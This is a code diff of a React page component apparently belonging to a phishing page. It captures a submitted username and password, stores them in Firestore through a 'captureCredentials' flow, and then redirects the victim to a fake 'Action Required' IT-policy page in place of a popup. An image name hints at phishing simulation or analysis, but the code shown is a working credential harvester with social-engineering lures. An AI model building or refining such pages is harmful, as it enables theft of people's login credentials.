@@ -2,9 +2,6 @@
 import { FormEvent, useState } from 'react';
 import { captureCredentials } from '@/ai/flows/capture-credentials';
 
-// Make Swal available in the component
-declare const Swal: any;
-
 export default function Home() {
   const imageUrl = "https://storage.googleapis.com/fsm-build-artefacts/PhishingSampleAnalysis10June-1.jpg";
 
@@ -22,31 +19,15 @@ export default function Home() {
       // Capture credentials on the backend (saves to Firestore)
       await captureCredentials({ username, password });
       
-      // Show the popup after credentials have been submitted
-      if (typeof Swal !== 'undefined') {
-        Swal.fire({
-          title: "Action Required: Employee Asset Details",
-          text: "Please review and update your asset information in accordance with the new IT policy.",
-          icon: "info",
-          confirmButtonText: "Update Now",
-          confirmButtonColor: "#3085d6",
-          background: "#fff",
-          color: "#333"
-        });
-      }
+      // Redirect to the page that shows the popup
+      window.location.href = '/action-required.html';
+
     } catch (error) {
       console.error("An error occurred during submission:", error);
-      // Optionally, show an error to the user
-      if (typeof Swal !== 'undefined') {
-        Swal.fire({
-          title: "Error",
-          text: "Could not submit your credentials. Please try again.",
-          icon: "error",
-        });
-      }
-    } finally {
+      // If there's an error, re-enable the form
       setIsSubmitting(false);
     }
+    // No finally block needed as we are redirecting on success.
   };
   
   return (
